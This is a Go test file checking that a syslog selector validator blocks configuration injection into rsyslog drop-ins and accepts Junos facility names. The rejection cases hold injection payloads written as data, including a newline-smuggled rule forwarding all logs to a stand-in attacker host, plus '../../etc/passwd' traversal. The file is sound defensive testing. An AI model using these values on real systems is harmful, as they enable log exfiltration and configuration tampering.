package daemon

import "testing"

// #5797 invariant 7, render-belt half.
//
// applySyslogFiles / applySyslogUsers build an rsyslog selector line
// `<facility>.<severity>\t<target>` from config tokens and write it to a
// managed drop-in under /etc/rsyslog.d. #4902 belted the file NAME and the
// user TOKEN on that exact line against leniently-loaded / peer-synced values
// but left the two SELECTOR tokens unchecked, so a newline or an rsyslog
// metacharacter in a facility/severity escaped the selector and injected
// configuration. syslogSelectorTokenSafe closes that.
//
// The belt is a SHAPE check on purpose. Deciding which facility NAMES are
// honoured means reconciling the Junos vocabulary (`authorization`, `kernel`,
// `interactive-commands`) against the BSD/rsyslog names the runtime maps
// (`auth`, `kern`) — an operator-visible mapping change deferred on #5797.
// TestSyslogSelectorTokenAcceptsJunosVocabulary_5797 pins that the belt does
// NOT pre-empt that decision by rejecting names the runtime cannot yet map.

// TestSyslogSelectorTokenRejectsInjection_5797 is the fail-on-revert guard.
// Reverting either belt call site makes the corresponding destination render a
// drop-in built from these tokens.
func TestSyslogSelectorTokenRejectsInjection_5797(t *testing.T) {
	cases := []struct {
		name string
		tok  string
	}{
		// The primary vector: a newline ends the selector line and the rest is
		// parsed by rsyslog as its own directive.
		{"embedded newline", "daemon\n*.* @@attacker.example:514"},
		{"embedded CR", "daemon\r*.* /tmp/pwn"},
		// rsyslog statement / selector grammar.
		{"statement separator", "daemon;*.*"},
		{"selector dot", "daemon.info"},
		{"wildcard", "*"},
		{"colon action prefix", "daemon:omusrmsg:root"},
		{"comma facility list", "daemon,auth"},
		// Whitespace splits the selector from its action field.
		{"space", "daemon info"},
		{"tab", "daemon\tinfo"},
		// Control bytes.
		{"NUL", "daemon\x00"},
		{"DEL", "daemon\x7f"},
		// Path traversal in a token that reaches a written file's content.
		{"slash", "../../etc/passwd"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if syslogSelectorTokenSafe(c.tok) {
				t.Fatalf("selector token %q accepted as safe; it can escape the rsyslog "+
					"selector line and inject configuration (#5797)", c.tok)
			}
		})
	}
}

// TestSyslogSelectorTokenAcceptsJunosVocabulary_5797 is the over-rejection
// guard. It is the reason this belt is a shape check: it must accept every
// legitimate Junos facility/severity spelling — INCLUDING the Junos names the
// runtime does not yet map to a numeric facility — so the belt cannot silently
// pre-empt the deferred mapping decision by dropping valid destinations.
func TestSyslogSelectorTokenAcceptsJunosVocabulary_5797(t *testing.T) {
	safe := []string{
		// Empty: both call sites map it to the `*` wildcard, so it is ordinary
		// configuration rather than an omission.
		"",
		// Facilities the runtime maps today.
		"kern", "user", "daemon", "auth", "syslog", "change-log",
		"local0", "local1", "local2", "local3", "local4", "local5", "local6", "local7",
		// Junos facility names the runtime does NOT yet map. These must still
		// render — rejecting them here would turn a deferred mapping decision
		// into a silent loss of the destination.
		"authorization", "kernel", "interactive-commands", "conflict-log",
		"pfe", "security", "firewall", "external", "ftp", "ntp", "dfc",
		// Severities.
		"any", "none", "emergency", "alert", "critical",
		"error", "warning", "notice", "info", "debug",
	}
	for _, tok := range safe {
		if !syslogSelectorTokenSafe(tok) {
			t.Errorf("legitimate syslog selector token %q rejected — the belt is scoped "+
				"wider than the injection surface it guards", tok)
		}
	}
}
